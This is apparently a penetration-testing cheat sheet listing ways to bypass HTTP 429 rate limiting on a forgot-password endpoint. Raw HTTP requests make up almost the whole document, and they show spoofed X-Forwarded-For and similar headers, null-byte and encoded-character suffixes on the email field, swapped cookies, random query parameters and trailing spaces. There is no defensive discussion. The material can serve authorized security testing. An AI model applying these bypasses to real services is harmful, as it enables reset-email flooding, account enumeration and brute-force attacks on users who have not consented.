# 429 Bypass (Too Many Requests)
### Custom Header
```bash
# Try add custom headers
X-Forwarded-For : 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Client-IP : 127.0.0.1
X-Remote-IP : 127.0.0.1
X-Remote-Addr : 127.0.0.1
X-Host : 127.0.0.1

# Try this to bypass
POST /ForgotPass.php HTTP/1.1
Host: target.com
X-Forwarded-For : 127.0.0.1
...

email=victim@gmail.com
```
### Adding Null Byte `%00` or CRLF `%09`, `%0d`, `%0a` at the end of the Email can bypass rate limit
```bash
POST /ForgotPass.php HTTP/1.1
Host: target.com
...

email=victim@gmail.com%00

```
### Try changing `user-agents`, `cookies` and `IP address`
```bash
# Normal Request (429)
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: xxxxxxxxxx
...

email=victim@gmail.com


# Try this to bypass (200)
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: aaaaaaaaaaaaa
...

email=victim@gmail.com

```

### Add a random parameter on the last endpoint
```bash
# Normal Request (429)
POST /ForgotPass.php HTTP/1.1
Host: target.com
...

email=victim@gmail.com

# Try this to bypass (200)
POST /ForgotPass.php?random HTTP/1.1
Host: target.com
...

email=victim@gmail.com
```

### Add `space` after the parameter value
```bash
# Normal Request (429)
POST /api/forgotpass HTTP/1.1
Host: target.com
...

{"email":"victim@gmail.com"}

# Try this to bypass (200)
POST /api/forgotpass HTTP/1.1
Host: target.com
...

{"email":"victim@gmail.com "}
```















